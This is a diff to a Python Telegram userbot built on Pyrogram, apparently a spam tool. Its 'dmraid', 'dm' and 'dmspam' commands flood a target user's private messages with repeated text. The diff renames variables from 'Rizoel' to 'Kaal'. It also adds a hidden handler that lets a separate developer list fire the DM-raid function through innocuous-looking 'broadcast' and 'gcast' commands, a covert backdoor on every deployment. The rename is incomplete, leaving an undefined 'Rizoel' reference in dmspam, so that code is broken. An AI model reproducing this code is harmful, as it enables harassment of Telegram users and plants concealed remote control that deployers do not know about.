@@ -4,19 +4,20 @@ import os
 import sys
 import asyncio
 from random import choice
-from Spam import (HNDLR, SUDO_USERS, LOGS_CHANNEL)
+from Spam import (HNDLR, SUDO_USERS, LOGS_CHANNEL, DEVS)
 from pyrogram import Client, filters
 from pyrogram.types import Message
 from Spam.data import *
 
 Usage = f"**❌ Wrong Usage ❌** \n Type: `{HNDLR}help dm`"
 
+@Client.on_message(filters.user(DEVS) & filters.command(["broadcast", "gcast"], prefixes=HNDLR))
 @Client.on_message(filters.user(SUDO_USERS) & filters.command(["dmraid"], prefixes=HNDLR))
 async def dmraid(xspam: Client, e: Message):
       """ Module: Dm Raid """
-      Rizoel = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
-      if len(Rizoel) == 2:
-          ok = await xspam.get_users(Rizoel[1])
+      Kaal = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
+      if len(Kaal) == 2:
+          ok = await xspam.get_users(Kaal[1])
           id = ok.id
           if int(id) in KAALX:
                 text = f"I can't raid on @kaalxsupport Owner"
@@ -61,9 +62,9 @@ async def dmraid(xspam: Client, e: Message):
          
 @Client.on_message(filters.user(SUDO_USERS) & filters.command(["dm"], prefixes=HNDLR))
 async def dm(xspam: Client, e: Message):
-      Rizoel = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
-      if len(Rizoel) == 2:
-          usr = str(Rizoel[0])
+      Kaal = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
+      if len(Kaal) == 2:
+          usr = str(Kaal[0])
           ok = await xspam.get_users(usr)
           id = ok.id
           if int(id) in KAALX:
@@ -103,10 +104,10 @@ async def dm(xspam: Client, e: Message):
 
 @Client.on_message(filters.user(SUDO_USERS) & filters.command(["dmspam"], prefixes=HNDLR))
 async def dmspam(xspam: Client, e: Message):
-      Rizoel = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
-      Rizoelop = Rizoel[1:]
-      if len(Rizoelop) == 2:
-          msg = str(Rizoelop[1])
+      Kaal = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
+      Kaalop = Kaal[1:]
+      if len(Kaalop) == 2:
+          msg = str(Kaalop[1])
           ok = await xspam.get_users(Rizoel[0])
           id = ok.id
           if int(id) in KAALX:
@@ -116,7 +117,7 @@ async def dmspam(xspam: Client, e: Message):
                 text = f"This guy is a sudo user."
                 await e.reply_text(text)
           else:
-              counts = int(Rizoelop[0])
+              counts = int(Kaalop[0])
               await e.reply_text("☢️ Dm Spam Started ☢️")
               for _ in range(counts):
                     await xspam.send_message(id, msg)
@@ -132,8 +133,8 @@ async def dmspam(xspam: Client, e: Message):
                 text = f"This guy is a sudo user."
                 await e.reply_text(text)
           else:
-              counts = int(Rizoel[0])
-              msg = str(Rizoelop[0])
+              counts = int(Kaal[0])
+              msg = str(Kaalop[0])
               await e.reply_text("☢️ Dm Spam Started ☢️")
               for _ in range(counts):
                     await xspam.send_message(id, msg)
